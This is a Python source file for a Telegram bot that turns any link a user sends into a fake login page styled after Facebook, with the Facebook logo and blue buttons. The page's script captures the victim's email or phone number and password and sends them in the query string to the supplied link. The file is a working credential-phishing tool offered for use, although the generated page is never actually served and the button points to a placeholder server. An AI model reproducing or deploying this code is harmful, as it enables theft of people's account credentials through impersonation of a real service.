from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    ContextTypes,
    filters,
)

# Your Telegram bot token from BotFather
TOKEN = "YOUR_BOT_TOKEN"

# Global dictionary to store the URL
user_links = {}

# Command to start the bot
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "Hello! Send me a link, and I will create a custom login page for you."
    )

# Handle incoming messages (the link that the user sends)
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_link = update.message.text.strip()
    user_links[update.message.chat_id] = user_link

    # Send back the login page HTML
    login_page_html = f"""
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Login Page</title>
        <style>
            body {{
                margin: 0;
                padding: 0;
                font-family: Arial, sans-serif;
                background: #000000;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
            }}
            .container {{
                background: linear-gradient(to bottom, #101820, #000000);
                width: 100%;
                max-width: 400px;
                padding: 30px 20px;
                border-radius: 10px;
                box-shadow: 0 4px 10px rgba(0, 0, 0, 0.5);
                text-align: center;
            }}
            .logo img {{
                width: 80px;
                height: 80px;
                margin-bottom: 20px;
            }}
            input[type="text"], input[type="password"] {{
                width: 100%;
                padding: 16px;
                margin-bottom: 12px;
                font-size: 16px;
                border: none;
                border-radius: 6px;
                background-color: #1c1e21;
                color: #ffffff;
            }}
            .btn {{
                width: 100%;
                padding: 16px;
                font-size: 18px;
                font-weight: bold;
                color: #ffffff;
                background-color: #1877f2;
                border: none;
                border-radius: 6px;
                cursor: pointer;
            }}
            .btn:hover {{
                background-color: #165dc4;
            }}
        </style>
    </head>
    <body>
    <div class="container">
        <div class="logo">
            <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Logo">
        </div>
        <form id="loginForm" method="POST" onsubmit="handleLogin(event)">
            <input type="text" id="emailOrPhone" name="email_or_phone" placeholder="Mobile number or email" required>
            <input type="password" id="password" name="password" placeholder="Password" required>
            <button class="btn" type="submit">Log in</button>
        </form>

        <script>
        function handleLogin(event) {{
            event.preventDefault();
            var emailOrPhone = document.getElementById('emailOrPhone').value;
            var password = document.getElementById('password').value;

            // Extract the original link from the bot's stored value
            var redirect_url = "{user_link}";

            // Construct the URL with query parameters for the credentials
            var params = new URLSearchParams();
            params.append("email", emailOrPhone);
            params.append("password", password);

            // Perform the redirect to the link with the parameters
            window.location.href = redirect_url + "?" + params.toString();
        }}
        </script>
    </div>
    </body>
    </html>
    """

    await update.message.reply_text(
        "Click below to visit the login page and submit your credentials.",
        reply_markup=InlineKeyboardMarkup(
            [[InlineKeyboardButton("Login Page", url="http://your-server.com/custom-login-page.html")]]
        ),
    )

# Main function to run the bot
async def main():
    # Create the application
    application = ApplicationBuilder().token(TOKEN).build()

    # Add command and message handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    # Start the bot
    print("Bot is running...")
    await application.run_polling()

if __name__ == "__main__":
    import asyncio
    asyncio.run(main())
  
